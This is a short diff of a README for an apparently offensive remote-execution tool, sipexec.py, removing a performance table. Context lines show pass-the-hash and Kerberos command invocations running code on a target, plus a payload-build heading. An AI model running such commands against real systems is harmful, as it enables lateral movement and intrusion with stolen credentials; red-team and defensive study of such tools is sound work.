@@ -44,15 +44,6 @@ python3 sipexec.py -hashes :NTHASH 'user@target' whoami
 python3 sipexec.py -k -dc-ip 10.0.0.1 'user@target' whoami
 ```
 
-## Performance
-
-| Target | Time | Context |
-|--------|------|---------|
-| Local (<1ms RTT) | ~2s | admin |
-| VPN (~76ms RTT) | ~5-12s | admin |
-
-Consistent back-to-back execution — cleanup kills wmiprvse to clear FinalPolicy cache.
-
 ## Build Payload
 
 ```bash
